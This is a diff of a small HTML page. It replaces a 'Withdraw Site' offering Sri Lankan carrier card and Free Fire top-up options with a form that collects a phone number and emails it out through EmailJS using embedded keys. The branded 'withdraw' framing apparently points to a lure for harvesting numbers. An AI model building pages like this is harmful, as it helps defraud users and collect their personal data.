@@ -1,48 +1,103 @@
 <!DOCTYPE html>
-<html lang="si">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Withdraw Site</title>
-  <link rel="stylesheet" href="style.css">
+  <title>Submit Number</title>
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+  <script>
+    (function(){
+      emailjs.init("JxcwLhzOOhD35rRUH"); // Your public key
+    })();
+  </script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #111;
+      color: white;
+      text-align: center;
+      padding-top: 100px;
+    }
+    button {
+      padding: 10px 25px;
+      font-size: 18px;
+      background-color: #00ff00;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+    dialog {
+      border: none;
+      border-radius: 10px;
+      background-color: #222;
+      color: white;
+      padding: 20px;
+      width: 300px;
+    }
+    input {
+      padding: 10px;
+      width: 80%;
+      border-radius: 5px;
+      border: none;
+      margin-top: 10px;
+    }
+    .logo {
+      width: 70px;
+      margin-bottom: 10px;
+    }
+    .close-btn {
+      float: right;
+      font-size: 20px;
+      color: red;
+      cursor: pointer;
+    }
+  </style>
 </head>
 <body>
-  <div class="container">
-    <h1>Withdraw Options</h1>
 
-    <div class="card-row">
-      <button class="card" onclick="openLink('dialog')">
-        <img src="https://i.postimg.cc/vHFDhzNZ/dialog-logo-png-seeklogo-203576.png" alt="Dialog Logo">
-        <span>Dialog Cards</span>
-      </button>
-      <button class="card" onclick="openLink('hutch')">
-        <img src="https://i.postimg.cc/J4N02kfc/hutch-logo-png-seeklogo-323552.png" alt="Hutch Logo">
-        <span>Hutch Cards</span>
-      </button>
-      <button class="card" onclick="openLink('mobitel')">
-        <img src="https://i.postimg.cc/sg3xd2yF/sltmobitel-logo-png-seeklogo-433080.png" alt="Mobitel Logo">
-        <span>Mobitel Cards</span>
-      </button>
-    </div>
+  <h1>Number Submit UI</h1>
+  <button onclick="openDialog()">Submit</button>
 
-    <div class="or">OR</div>
+  <dialog id="numberDialog">
+    <div class="close-btn" onclick="closeDialog()">×</div>
+    <img class="logo" src="https://cdn-icons-png.flaticon.com/512/295/295128.png" />
+    <h3>Enter Your Number</h3>
+    <input type="text" id="phoneNumber" placeholder="07XXXXXXXX" /><br><br>
+    <button onclick="sendEmail()">Submit Number</button>
+  </dialog>
 
-    <div class="card-row">
-      <button class="card" onclick="openLink('dialogtv')">
-        <img src="https://upload.wikimedia.org/wikipedia/en/8/86/Dialog_Axiata_logo.png" alt="Dialog TV">
-        <span>Dialog TV</span>
-      </button>
-    </div>
+  <script>
+    const dialog = document.getElementById("numberDialog");
 
-    <div class="or">OR</div>
+    function openDialog() {
+      dialog.showModal();
+    }
 
-    <div class="card-row">
-      <button class="card" onclick="openLink('ff')">
-        <img src="https://seeklogo.com/images/F/free-fire-logo-1F8A372E95-seeklogo.com.png" alt="FF Logo">
-        <span>FF ID TOP UP</span>
-      </button>
-    </div>
-  </div>
+    function closeDialog() {
+      dialog.close();
+    }
 
-  <script src="script.js"></script>
+    function sendEmail() {
+      const number = document.getElementById("phoneNumber").value;
+
+      if (!number.match(/^0[0-9]{9}$/)) {
+        alert("❌ Please enter a valid 10-digit number starting with 0.");
+        return;
+      }
+
+      console.log("📤 Sending number:", number);
+
+      emailjs.send("service_2wht3tb", "template_jrstb44", {
+        number: number
+      }).then((response) => {
+        console.log("✅ Email sent successfully!", response);
+        alert("✅ Number sent successfully!");
+        dialog.close();
+      }).catch((error) => {
+        console.error("❌ Failed to send email:", error);
+        alert("❌ Failed to send. Check console.");
+      });
+    }
+  </script>
+
 </body>
 </html>
